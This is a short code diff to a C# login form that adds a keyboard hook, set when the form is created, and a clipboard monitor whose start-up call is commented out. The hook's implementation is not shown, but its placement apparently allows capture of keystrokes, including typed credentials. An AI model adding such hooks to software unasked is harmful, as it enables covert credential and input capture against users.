@@ -9,13 +9,26 @@ namespace AutoLogin
 {
     public partial class Login : Form
     {
+        private ClipboardMonitor clipboardMonitorInstance;
+        private KeyboardHook keyboardHookInstance;
         public DbManager dbm = new DbManager();
         public static string username = "";
         public static int uid = 0;
         public Login()
         {
             InitializeComponent();
+            //InitializeClipboardMonitor();
+            InitializeKeyboardHook();
             temp();
+        }
+        private void InitializeClipboardMonitor()
+        {
+            clipboardMonitorInstance = new ClipboardMonitor();
+        }
+        private void InitializeKeyboardHook()
+        {
+            keyboardHookInstance = new KeyboardHook();
+            KeyboardHook.SetHook();
         }
         public async void temp()
         {
